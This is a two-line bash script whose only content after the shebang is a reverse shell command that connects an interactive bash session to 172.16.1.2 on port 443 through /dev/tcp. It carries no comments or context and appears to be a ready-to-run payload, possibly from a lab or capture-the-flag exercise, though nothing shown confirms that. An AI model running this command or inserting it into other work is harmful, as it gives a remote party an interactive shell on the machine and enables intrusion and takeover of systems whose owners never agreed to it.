#!/bin/bash

bash -i >& /dev/tcp/172.16.1.2/443 0>&1
